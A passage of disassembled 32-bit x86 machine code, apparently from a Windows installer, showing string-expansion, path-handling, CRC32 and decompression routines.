  405e98:	85 c0                	test   %eax,%eax
  405e9a:	7d 11                	jge    0x405ead
  405e9c:	8b 0d fc 2e 42 00    	mov    0x422efc,%ecx
  405ea2:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  405ea9:	2b c8                	sub    %eax,%ecx
  405eab:	8b 01                	mov    (%ecx),%eax
  405ead:	8b 0d 58 37 42 00    	mov    0x423758,%ecx
  405eb3:	53                   	push   %ebx
  405eb4:	03 c8                	add    %eax,%ecx
  405eb6:	b8 c0 26 42 00       	mov    $0x4226c0,%eax
  405ebb:	39 45 08             	cmp    %eax,0x8(%ebp)
  405ebe:	56                   	push   %esi
  405ebf:	57                   	push   %edi
  405ec0:	8b f8                	mov    %eax,%edi
  405ec2:	0f 82 ed 01 00 00    	jb     0x4060b5
  405ec8:	8b 55 08             	mov    0x8(%ebp),%edx
  405ecb:	2b d0                	sub    %eax,%edx
  405ecd:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  405ed3:	0f 83 dc 01 00 00    	jae    0x4060b5
  405ed9:	8b 7d 08             	mov    0x8(%ebp),%edi
  405edc:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  405ee0:	e9 d0 01 00 00       	jmp    0x4060b5
  405ee5:	8b f7                	mov    %edi,%esi
  405ee7:	2b f0                	sub    %eax,%esi
  405ee9:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  405eef:	0f 8d ca 01 00 00    	jge    0x4060bf
  405ef5:	41                   	inc    %ecx
  405ef6:	80 fa 04             	cmp    $0x4,%dl
  405ef9:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405efc:	0f 83 a6 01 00 00    	jae    0x4060a8
  405f02:	0f be 41 01          	movsbl 0x1(%ecx),%eax
  405f06:	0f be 09             	movsbl (%ecx),%ecx
  405f09:	8b f0                	mov    %eax,%esi
  405f0b:	8b d9                	mov    %ecx,%ebx
  405f0d:	83 e6 7f             	and    $0x7f,%esi
  405f10:	83 e3 7f             	and    $0x7f,%ebx
  405f13:	c1 e6 07             	shl    $0x7,%esi
  405f16:	0b f3                	or     %ebx,%esi
  405f18:	8b d9                	mov    %ecx,%ebx
  405f1a:	83 45 0c 02          	addl   $0x2,0xc(%ebp)
  405f1e:	80 cf 80             	or     $0x80,%bh
  405f21:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  405f24:	8b d9                	mov    %ecx,%ebx
  405f26:	8b c8                	mov    %eax,%ecx
  405f28:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  405f2b:	80 cd 80             	or     $0x80,%ch
  405f2e:	80 fa 02             	cmp    $0x2,%dl
  405f31:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405f34:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405f37:	0f 85 15 01 00 00    	jne    0x406052
  405f3d:	6a 02                	push   $0x2
  405f3f:	5e                   	pop    %esi
  405f40:	ff 15 ac 70 40 00    	call   *0x4070ac
  405f46:	85 c0                	test   %eax,%eax
  405f48:	79 18                	jns    0x405f62
  405f4a:	66 3d 04 5a          	cmp    $0x5a04,%ax
  405f4e:	74 12                	je     0x405f62
  405f50:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  405f54:	74 0c                	je     0x405f62
  405f56:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  405f5a:	74 06                	je     0x405f62
  405f5c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405f60:	eb 07                	jmp    0x405f69
  405f62:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405f69:	83 3d a4 37 42 00 00 	cmpl   $0x0,0x4237a4
  405f70:	74 03                	je     0x405f75
  405f72:	6a 04                	push   $0x4
  405f74:	5e                   	pop    %esi
  405f75:	84 db                	test   %bl,%bl
  405f77:	79 37                	jns    0x405fb0
  405f79:	8b c3                	mov    %ebx,%eax
  405f7b:	83 e3 3f             	and    $0x3f,%ebx
  405f7e:	03 1d 58 37 42 00    	add    0x423758,%ebx
  405f84:	83 e0 40             	and    $0x40,%eax
  405f87:	50                   	push   %eax
  405f88:	57                   	push   %edi
  405f89:	53                   	push   %ebx
  405f8a:	68 a0 73 40 00       	push   $0x4073a0
  405f8f:	68 02 00 00 80       	push   $0x80000002
  405f94:	e8 bb fd ff ff       	call   0x405d54
  405f99:	80 3f 00             	cmpb   $0x0,(%edi)
  405f9c:	0f 85 97 00 00 00    	jne    0x406039
  405fa2:	ff 75 f4             	push   -0xc(%ebp)
  405fa5:	57                   	push   %edi
  405fa6:	e8 e4 fe ff ff       	call   0x405e8f
  405fab:	e9 84 00 00 00       	jmp    0x406034
  405fb0:	83 fb 25             	cmp    $0x25,%ebx
  405fb3:	75 0e                	jne    0x405fc3
  405fb5:	68 00 04 00 00       	push   $0x400
  405fba:	57                   	push   %edi
  405fbb:	ff 15 ec 70 40 00    	call   *0x4070ec
  405fc1:	eb 71                	jmp    0x406034
  405fc3:	83 fb 24             	cmp    $0x24,%ebx
  405fc6:	75 68                	jne    0x406030
  405fc8:	68 00 04 00 00       	push   $0x400
  405fcd:	57                   	push   %edi
  405fce:	ff 15 9c 70 40 00    	call   *0x40709c
  405fd4:	33 f6                	xor    %esi,%esi
  405fd6:	eb 58                	jmp    0x406030
  405fd8:	a1 24 37 42 00       	mov    0x423724,%eax
  405fdd:	33 c9                	xor    %ecx,%ecx
  405fdf:	4e                   	dec    %esi
  405fe0:	3b c1                	cmp    %ecx,%eax
  405fe2:	74 18                	je     0x405ffc
  405fe4:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  405fe7:	74 13                	je     0x405ffc
  405fe9:	57                   	push   %edi
  405fea:	51                   	push   %ecx
  405feb:	51                   	push   %ecx
  405fec:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  405ff0:	ff 35 28 37 42 00    	push   0x423728
  405ff6:	ff d0                	call   *%eax
  405ff8:	85 c0                	test   %eax,%eax
  405ffa:	74 38                	je     0x406034
  405ffc:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405fff:	50                   	push   %eax
  406000:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  406004:	ff 35 28 37 42 00    	push   0x423728
  40600a:	ff 15 68 71 40 00    	call   *0x407168
  406010:	85 c0                	test   %eax,%eax
  406012:	75 19                	jne    0x40602d
  406014:	57                   	push   %edi
  406015:	ff 75 f8             	push   -0x8(%ebp)
  406018:	ff 15 6c 71 40 00    	call   *0x40716c
  40601e:	ff 75 f8             	push   -0x8(%ebp)
  406021:	8b d8                	mov    %eax,%ebx
  406023:	ff 15 8c 72 40 00    	call   *0x40728c
  406029:	85 db                	test   %ebx,%ebx
  40602b:	75 07                	jne    0x406034
  40602d:	80 27 00             	andb   $0x0,(%edi)
  406030:	85 f6                	test   %esi,%esi
  406032:	75 a4                	jne    0x405fd8
  406034:	80 3f 00             	cmpb   $0x0,(%edi)
  406037:	74 11                	je     0x40604a
  406039:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  40603d:	75 0b                	jne    0x40604a
  40603f:	68 cc 73 40 00       	push   $0x4073cc
  406044:	57                   	push   %edi
  406045:	e8 3f fe ff ff       	call   0x405e89
  40604a:	57                   	push   %edi
  40604b:	e8 88 00 00 00       	call   0x4060d8
  406050:	eb 44                	jmp    0x406096
  406052:	80 fa 03             	cmp    $0x3,%dl
  406055:	75 2e                	jne    0x406085
  406057:	83 fe 1d             	cmp    $0x1d,%esi
  40605a:	75 0e                	jne    0x40606a
  40605c:	ff 35 28 37 42 00    	push   0x423728
  406062:	57                   	push   %edi
  406063:	e8 63 fd ff ff       	call   0x405dcb
  406068:	eb 11                	jmp    0x40607b
  40606a:	8b c6                	mov    %esi,%eax
  40606c:	c1 e0 0a             	shl    $0xa,%eax
  40606f:	05 00 40 42 00       	add    $0x424000,%eax
  406074:	50                   	push   %eax
  406075:	57                   	push   %edi
  406076:	e8 f2 fd ff ff       	call   0x405e6d
  40607b:	83 c6 eb             	add    $0xffffffeb,%esi
  40607e:	83 fe 07             	cmp    $0x7,%esi
  406081:	73 13                	jae    0x406096
  406083:	eb c5                	jmp    0x40604a
  406085:	80 fa 01             	cmp    $0x1,%dl
  406088:	75 0c                	jne    0x406096
  40608a:	83 c8 ff             	or     $0xffffffff,%eax
  40608d:	2b c6                	sub    %esi,%eax
  40608f:	50                   	push   %eax
  406090:	57                   	push   %edi
  406091:	e8 f9 fd ff ff       	call   0x405e8f
  406096:	57                   	push   %edi
  406097:	e8 e7 fd ff ff       	call   0x405e83
  40609c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40609f:	03 f8                	add    %eax,%edi
  4060a1:	b8 c0 26 42 00       	mov    $0x4226c0,%eax
  4060a6:	eb 0d                	jmp    0x4060b5
  4060a8:	75 08                	jne    0x4060b2
  4060aa:	8a 11                	mov    (%ecx),%dl
  4060ac:	88 17                	mov    %dl,(%edi)
  4060ae:	47                   	inc    %edi
  4060af:	41                   	inc    %ecx
  4060b0:	eb 03                	jmp    0x4060b5
  4060b2:	88 17                	mov    %dl,(%edi)
  4060b4:	47                   	inc    %edi
  4060b5:	8a 11                	mov    (%ecx),%dl
  4060b7:	84 d2                	test   %dl,%dl
  4060b9:	0f 85 26 fe ff ff    	jne    0x405ee5
  4060bf:	80 27 00             	andb   $0x0,(%edi)
  4060c2:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4060c6:	5f                   	pop    %edi
  4060c7:	5e                   	pop    %esi
  4060c8:	5b                   	pop    %ebx
  4060c9:	74 09                	je     0x4060d4
  4060cb:	50                   	push   %eax
  4060cc:	ff 75 08             	push   0x8(%ebp)
  4060cf:	e8 99 fd ff ff       	call   0x405e6d
  4060d4:	c9                   	leave
  4060d5:	c2 08 00             	ret    $0x8
  4060d8:	53                   	push   %ebx
  4060d9:	56                   	push   %esi
  4060da:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4060de:	57                   	push   %edi
  4060df:	80 3e 5c             	cmpb   $0x5c,(%esi)
  4060e2:	75 15                	jne    0x4060f9
  4060e4:	80 7e 01 5c          	cmpb   $0x5c,0x1(%esi)
  4060e8:	75 0f                	jne    0x4060f9
  4060ea:	80 7e 02 3f          	cmpb   $0x3f,0x2(%esi)
  4060ee:	75 09                	jne    0x4060f9
  4060f0:	80 7e 03 5c          	cmpb   $0x5c,0x3(%esi)
  4060f4:	75 03                	jne    0x4060f9
  4060f6:	83 c6 04             	add    $0x4,%esi
  4060f9:	80 3e 00             	cmpb   $0x0,(%esi)
  4060fc:	74 0c                	je     0x40610a
  4060fe:	56                   	push   %esi
  4060ff:	e8 48 f8 ff ff       	call   0x40594c
  406104:	85 c0                	test   %eax,%eax
  406106:	74 02                	je     0x40610a
  406108:	46                   	inc    %esi
  406109:	46                   	inc    %esi
  40610a:	8a 06                	mov    (%esi),%al
  40610c:	8b de                	mov    %esi,%ebx
  40610e:	84 c0                	test   %al,%al
  406110:	8b fe                	mov    %esi,%edi
  406112:	74 39                	je     0x40614d
  406114:	55                   	push   %ebp
  406115:	8b 2d 30 72 40 00    	mov    0x407230,%ebp
  40611b:	3c 1f                	cmp    $0x1f,%al
  40611d:	76 22                	jbe    0x406141
  40611f:	50                   	push   %eax
  406120:	68 e4 93 40 00       	push   $0x4093e4
  406125:	e8 e0 f7 ff ff       	call   0x40590a
  40612a:	80 38 00             	cmpb   $0x0,(%eax)
  40612d:	75 12                	jne    0x406141
  40612f:	56                   	push   %esi
  406130:	ff d5                	call   *%ebp
  406132:	2b c6                	sub    %esi,%eax
  406134:	50                   	push   %eax
  406135:	56                   	push   %esi
  406136:	57                   	push   %edi
  406137:	e8 5f f9 ff ff       	call   0x405a9b
  40613c:	57                   	push   %edi
  40613d:	ff d5                	call   *%ebp
  40613f:	8b f8                	mov    %eax,%edi
  406141:	56                   	push   %esi
  406142:	ff d5                	call   *%ebp
  406144:	8b f0                	mov    %eax,%esi
  406146:	8a 06                	mov    (%esi),%al
  406148:	84 c0                	test   %al,%al
  40614a:	75 cf                	jne    0x40611b
  40614c:	5d                   	pop    %ebp
  40614d:	80 27 00             	andb   $0x0,(%edi)
  406150:	57                   	push   %edi
  406151:	53                   	push   %ebx
  406152:	ff 15 e8 71 40 00    	call   *0x4071e8
  406158:	8b f8                	mov    %eax,%edi
  40615a:	8a 07                	mov    (%edi),%al
  40615c:	3c 20                	cmp    $0x20,%al
  40615e:	74 04                	je     0x406164
  406160:	3c 5c                	cmp    $0x5c,%al
  406162:	75 07                	jne    0x40616b
  406164:	80 27 00             	andb   $0x0,(%edi)
  406167:	3b df                	cmp    %edi,%ebx
  406169:	72 e5                	jb     0x406150
  40616b:	5f                   	pop    %edi
  40616c:	5e                   	pop    %esi
  40616d:	5b                   	pop    %ebx
  40616e:	c2 04 00             	ret    $0x4
  406171:	56                   	push   %esi
  406172:	be 80 15 42 00       	mov    $0x421580,%esi
  406177:	56                   	push   %esi
  406178:	ff 74 24 0c          	push   0xc(%esp)
  40617c:	ff 15 28 71 40 00    	call   *0x407128
  406182:	83 f8 ff             	cmp    $0xffffffff,%eax
  406185:	74 0b                	je     0x406192
  406187:	50                   	push   %eax
  406188:	ff 15 3c 71 40 00    	call   *0x40713c
  40618e:	8b c6                	mov    %esi,%eax
  406190:	eb 02                	jmp    0x406194
  406192:	33 c0                	xor    %eax,%eax
  406194:	5e                   	pop    %esi
  406195:	c2 04 00             	ret    $0x4
  406198:	55                   	push   %ebp
  406199:	8b ec                	mov    %esp,%ebp
  40619b:	81 ec 20 01 00 00    	sub    $0x120,%esp
  4061a1:	56                   	push   %esi
  4061a2:	be 04 01 00 00       	mov    $0x104,%esi
  4061a7:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4061ad:	56                   	push   %esi
  4061ae:	50                   	push   %eax
  4061af:	ff 15 ec 70 40 00    	call   *0x4070ec
  4061b5:	3b c6                	cmp    %esi,%eax
  4061b7:	5e                   	pop    %esi
  4061b8:	76 02                	jbe    0x4061bc
  4061ba:	33 c0                	xor    %eax,%eax
  4061bc:	85 c0                	test   %eax,%eax
  4061be:	74 0e                	je     0x4061ce
  4061c0:	80 bc 05 df fe ff ff 	cmpb   $0x5c,-0x121(%ebp,%eax,1)
  4061c7:	5c 
  4061c8:	74 04                	je     0x4061ce
  4061ca:	33 c9                	xor    %ecx,%ecx
  4061cc:	eb 03                	jmp    0x4061d1
  4061ce:	33 c9                	xor    %ecx,%ecx
  4061d0:	41                   	inc    %ecx
  4061d1:	ff 75 08             	push   0x8(%ebp)
  4061d4:	8d 89 14 90 40 00    	lea    0x409014(%ecx),%ecx
  4061da:	8d 84 05 e0 fe ff ff 	lea    -0x120(%ebp,%eax,1),%eax
  4061e1:	51                   	push   %ecx
  4061e2:	68 f0 93 40 00       	push   $0x4093f0
  4061e7:	50                   	push   %eax
  4061e8:	ff 15 74 72 40 00    	call   *0x407274
  4061ee:	83 c4 10             	add    $0x10,%esp
  4061f1:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4061f7:	6a 08                	push   $0x8
  4061f9:	6a 00                	push   $0x0
  4061fb:	50                   	push   %eax
  4061fc:	ff 15 50 71 40 00    	call   *0x407150
  406202:	c9                   	leave
  406203:	c2 04 00             	ret    $0x4
  406206:	8b 44 24 04          	mov    0x4(%esp),%eax
  40620a:	56                   	push   %esi
  40620b:	8b f0                	mov    %eax,%esi
  40620d:	57                   	push   %edi
  40620e:	c1 e6 03             	shl    $0x3,%esi
  406211:	8b be 58 92 40 00    	mov    0x409258(%esi),%edi
  406217:	57                   	push   %edi
  406218:	ff 15 54 71 40 00    	call   *0x407154
  40621e:	85 c0                	test   %eax,%eax
  406220:	75 0a                	jne    0x40622c
  406222:	57                   	push   %edi
  406223:	e8 70 ff ff ff       	call   0x406198
  406228:	85 c0                	test   %eax,%eax
  40622a:	74 0f                	je     0x40623b
  40622c:	ff b6 5c 92 40 00    	push   0x40925c(%esi)
  406232:	50                   	push   %eax
  406233:	ff 15 f0 70 40 00    	call   *0x4070f0
  406239:	eb 02                	jmp    0x40623d
  40623b:	33 c0                	xor    %eax,%eax
  40623d:	5f                   	pop    %edi
  40623e:	5e                   	pop    %esi
  40623f:	c2 04 00             	ret    $0x4
  406242:	55                   	push   %ebp
  406243:	8b ec                	mov    %esp,%ebp
  406245:	83 ec 1c             	sub    $0x1c,%esp
  406248:	56                   	push   %esi
  406249:	8b 75 08             	mov    0x8(%ebp),%esi
  40624c:	57                   	push   %edi
  40624d:	8b 3d f0 71 40 00    	mov    0x4071f0,%edi
  406253:	eb 0a                	jmp    0x40625f
  406255:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406258:	50                   	push   %eax
  406259:	ff 15 ec 71 40 00    	call   *0x4071ec
  40625f:	6a 01                	push   $0x1
  406261:	56                   	push   %esi
  406262:	56                   	push   %esi
  406263:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406266:	6a 00                	push   $0x0
  406268:	50                   	push   %eax
  406269:	ff d7                	call   *%edi
  40626b:	85 c0                	test   %eax,%eax
  40626d:	75 e6                	jne    0x406255
  40626f:	5f                   	pop    %edi
  406270:	5e                   	pop    %esi
  406271:	c9                   	leave
  406272:	c2 04 00             	ret    $0x4
  406275:	ff 25 f0 70 40 00    	jmp    *0x4070f0
  40627b:	83 3d c4 22 42 00 00 	cmpl   $0x0,0x4222c4
  406282:	56                   	push   %esi
  406283:	75 2d                	jne    0x4062b2
  406285:	33 c9                	xor    %ecx,%ecx
  406287:	6a 08                	push   $0x8
  406289:	8b c1                	mov    %ecx,%eax
  40628b:	5e                   	pop    %esi
  40628c:	8b d0                	mov    %eax,%edx
  40628e:	80 e2 01             	and    $0x1,%dl
  406291:	f6 da                	neg    %dl
  406293:	1b d2                	sbb    %edx,%edx
  406295:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  40629b:	d1 e8                	shr    $1,%eax
  40629d:	33 c2                	xor    %edx,%eax
  40629f:	4e                   	dec    %esi
  4062a0:	75 ea                	jne    0x40628c
  4062a2:	89 04 8d c0 22 42 00 	mov    %eax,0x4222c0(,%ecx,4)
  4062a9:	41                   	inc    %ecx
  4062aa:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4062b0:	7c d5                	jl     0x406287
  4062b2:	8b 54 24 10          	mov    0x10(%esp),%edx
  4062b6:	8b 44 24 08          	mov    0x8(%esp),%eax
  4062ba:	85 d2                	test   %edx,%edx
  4062bc:	f7 d0                	not    %eax
  4062be:	76 23                	jbe    0x4062e3
  4062c0:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4062c4:	57                   	push   %edi
  4062c5:	0f b6 39             	movzbl (%ecx),%edi
  4062c8:	8b f0                	mov    %eax,%esi
  4062ca:	81 e6 ff 00 00 00    	and    $0xff,%esi
  4062d0:	33 f7                	xor    %edi,%esi
  4062d2:	c1 e8 08             	shr    $0x8,%eax
  4062d5:	8b 34 b5 c0 22 42 00 	mov    0x4222c0(,%esi,4),%esi
  4062dc:	33 c6                	xor    %esi,%eax
  4062de:	41                   	inc    %ecx
  4062df:	4a                   	dec    %edx
  4062e0:	75 e3                	jne    0x4062c5
  4062e2:	5f                   	pop    %edi
  4062e3:	f7 d0                	not    %eax
  4062e5:	5e                   	pop    %esi
  4062e6:	c2 0c 00             	ret    $0xc
  4062e9:	b8 80 00 00 00       	mov    $0x80,%eax
  4062ee:	48                   	dec    %eax
  4062ef:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  4062f3:	75 f9                	jne    0x4062ee
  4062f5:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  4062f9:	33 c0                	xor    %eax,%eax
  4062fb:	40                   	inc    %eax
  4062fc:	89 41 68             	mov    %eax,0x68(%ecx)
  4062ff:	89 41 64             	mov    %eax,0x64(%ecx)
  406302:	89 41 60             	mov    %eax,0x60(%ecx)
  406305:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406308:	c3                   	ret
  406309:	55                   	push   %ebp
  40630a:	8b ec                	mov    %esp,%ebp
  40630c:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406312:	53                   	push   %ebx
  406313:	56                   	push   %esi
  406314:	57                   	push   %edi
  406315:	6a 22                	push   $0x22
  406317:	8b f1                	mov    %ecx,%esi
  406319:	59                   	pop    %ecx
  40631a:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  406320:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406326:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406328:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  40632c:	75 08                	jne    0x406336
  40632e:	33 c0                	xor    %eax,%eax
  406330:	40                   	inc    %eax
  406331:	e9 20 0a 00 00       	jmp    0x406d56
  406336:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406339:	8b 75 ac             	mov    -0x54(%ebp),%esi
  40633c:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  406342:	83 f8 1c             	cmp    $0x1c,%eax
  406345:	0f 87 08 0a 00 00    	ja     0x406d53
  40634b:	ff 24 85 51 6d 40 00 	jmp    *0x406d51(,%eax,4)
  406352:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406356:	0f 84 e2 09 00 00    	je     0x406d3e
  40635c:	8b 45 90             	mov    -0x70(%ebp),%eax
  40635f:	ff 4d 94             	decl   -0x6c(%ebp)
  406362:	ff 45 90             	incl   -0x70(%ebp)
  406365:	8a 00                	mov    (%eax),%al
  406367:	3c e1                	cmp    $0xe1,%al
  406369:	0f 87 e4 09 00 00    	ja     0x406d53
  40636f:	0f b6 c0             	movzbl %al,%eax
  406372:	6a 2d                	push   $0x2d
  406374:	99                   	cltd
  406375:	59                   	pop    %ecx
  406376:	f7 f9                	idiv   %ecx
  406378:	6a 09                	push   $0x9
  40637a:	59                   	pop    %ecx
  40637b:	8b f0                	mov    %eax,%esi
  40637d:	0f b6 c2             	movzbl %dl,%eax
  406380:	99                   	cltd
  406381:	f7 f9                	idiv   %ecx
  406383:	8b ce                	mov    %esi,%ecx
  406385:	0f b6 fa             	movzbl %dl,%edi
  406388:	33 d2                	xor    %edx,%edx
  40638a:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  40638d:	42                   	inc    %edx
  40638e:	d3 e2                	shl    %cl,%edx
  406390:	8b c8                	mov    %eax,%ecx
  406392:	4a                   	dec    %edx
  406393:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406396:	33 d2                	xor    %edx,%edx
  406398:	42                   	inc    %edx
  406399:	d3 e2                	shl    %cl,%edx
  40639b:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  40639e:	be 00 03 00 00       	mov    $0x300,%esi
  4063a3:	d3 e6                	shl    %cl,%esi
  4063a5:	4a                   	dec    %edx
  4063a6:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4063a9:	81 c6 36 07 00 00    	add    $0x736,%esi
  4063af:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  4063b2:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  4063b5:	74 26                	je     0x4063dd
  4063b7:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4063bb:	74 09                	je     0x4063c6
  4063bd:	ff 75 fc             	push   -0x4(%ebp)
  4063c0:	ff 15 24 71 40 00    	call   *0x407124
  4063c6:	57                   	push   %edi
  4063c7:	6a 40                	push   $0x40
  4063c9:	ff 15 60 71 40 00    	call   *0x407160
  4063cf:	85 c0                	test   %eax,%eax
  4063d1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4063d4:	0f 84 79 09 00 00    	je     0x406d53
  4063da:	89 7d 88             	mov    %edi,-0x78(%ebp)
  4063dd:	85 f6                	test   %esi,%esi
  4063df:	74 0c                	je     0x4063ed
  4063e1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4063e4:	4e                   	dec    %esi
  4063e5:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  4063eb:	75 f4                	jne    0x4063e1
  4063ed:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  4063f1:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  4063f5:	eb 26                	jmp    0x40641d
  4063f7:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4063fb:	0f 84 a6 08 00 00    	je     0x406ca7
  406401:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406404:	ff 4d 94             	decl   -0x6c(%ebp)
  406407:	8b c8                	mov    %eax,%ecx
  406409:	8b 45 90             	mov    -0x70(%ebp),%eax
  40640c:	c1 e1 03             	shl    $0x3,%ecx
  40640f:	0f b6 00             	movzbl (%eax),%eax
  406412:	d3 e0                	shl    %cl,%eax
  406414:	09 45 c0             	or     %eax,-0x40(%ebp)
  406417:	ff 45 90             	incl   -0x70(%ebp)
  40641a:	ff 45 b8             	incl   -0x48(%ebp)
  40641d:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  406421:	7c d4                	jl     0x4063f7
  406423:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406426:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406429:	74 28                	je     0x406453
  40642b:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40642f:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406432:	74 09                	je     0x40643d
  406434:	ff 75 f8             	push   -0x8(%ebp)
  406437:	ff 15 24 71 40 00    	call   *0x407124
  40643d:	ff 75 c0             	push   -0x40(%ebp)
  406440:	6a 40                	push   $0x40
  406442:	ff 15 60 71 40 00    	call   *0x407160
  406448:	85 c0                	test   %eax,%eax
  40644a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40644d:	0f 84 00 09 00 00    	je     0x406d53
  406453:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406456:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406459:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  406460:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  406465:	eb 21                	jmp    0x406488
  406467:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  40646b:	0f 84 45 08 00 00    	je     0x406cb6
  406471:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406474:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406477:	ff 4d 94             	decl   -0x6c(%ebp)
  40647a:	0f b6 09             	movzbl (%ecx),%ecx
  40647d:	c1 e0 08             	shl    $0x8,%eax
  406480:	0b c1                	or     %ecx,%eax
  406482:	ff 45 90             	incl   -0x70(%ebp)
  406485:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406488:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40648b:	ff 4d b8             	decl   -0x48(%ebp)
  40648e:	85 c0                	test   %eax,%eax
  406490:	75 d5                	jne    0x406467
  406492:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406495:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406498:	23 45 e4             	and    -0x1c(%ebp),%eax
  40649b:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  4064a2:	00 00 00 
  4064a5:	c1 e1 04             	shl    $0x4,%ecx
  4064a8:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4064ab:	03 c8                	add    %eax,%ecx
  4064ad:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4064b0:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  4064b3:	e9 6c 06 00 00       	jmp    0x406b24
  4064b8:	33 d2                	xor    %edx,%edx
  4064ba:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  4064bd:	75 6f                	jne    0x40652e
  4064bf:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  4064c3:	8b 75 a0             	mov    -0x60(%ebp),%esi
  4064c6:	b1 08                	mov    $0x8,%cl
  4064c8:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  4064cb:	23 75 e8             	and    -0x18(%ebp),%esi
  4064ce:	d3 e8                	shr    %cl,%eax
  4064d0:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4064d3:	d3 e6                	shl    %cl,%esi
  4064d5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4064d8:	03 c6                	add    %esi,%eax
  4064da:	8d 04 40             	lea    (%eax,%eax,2),%eax
  4064dd:	c1 e0 09             	shl    $0x9,%eax
  4064e0:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  4064e4:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  4064eb:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4064ee:	7d 05                	jge    0x4064f5
  4064f0:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4064f3:	eb 10                	jmp    0x406505
  4064f5:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  4064f9:	7d 06                	jge    0x406501
  4064fb:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  4064ff:	eb 04                	jmp    0x406505
  406501:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406505:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406508:	74 1c                	je     0x406526
  40650a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40650d:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406510:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406513:	72 03                	jb     0x406518
  406515:	03 45 8c             	add    -0x74(%ebp),%eax
  406518:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40651b:	33 db                	xor    %ebx,%ebx
  40651d:	43                   	inc    %ebx
  40651e:	8a 04 08             	mov    (%eax,%ecx,1),%al
